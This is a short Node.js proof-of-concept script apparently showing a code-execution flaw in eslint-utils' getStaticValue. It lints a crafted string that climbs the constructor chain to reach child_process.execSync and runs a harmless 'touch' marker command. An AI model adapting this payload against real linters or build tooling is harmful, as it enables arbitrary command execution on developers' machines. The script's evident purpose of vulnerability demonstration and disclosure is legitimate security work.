const eUtils = require('eslint-utils');
const eslint = require('eslint')

//console.log(eUtils.getStaticValue("new Array(2)"));
// var espree = require("espree");
// let ast = espree.parse("new Array(2)")
// console.log(Object.keys(ast.body[0].expression))
// console.log(eUtils.getStaticValue(ast.body[0].expression));

const linter = new eslint.Linter()

linter.defineRule("test", context => ({
    ExpressionStatement(node) {                
        console.log(eUtils.getStaticValue(node))
    },
}))
console.log(linter.verify('({}.constructor.constructor("return process.mainModule.require(\'child_process\').execSync(\'touch eslint-utils-success.txt\')")())', {
    env: { es6: true },    
    rules: { test: "error" },
})[0])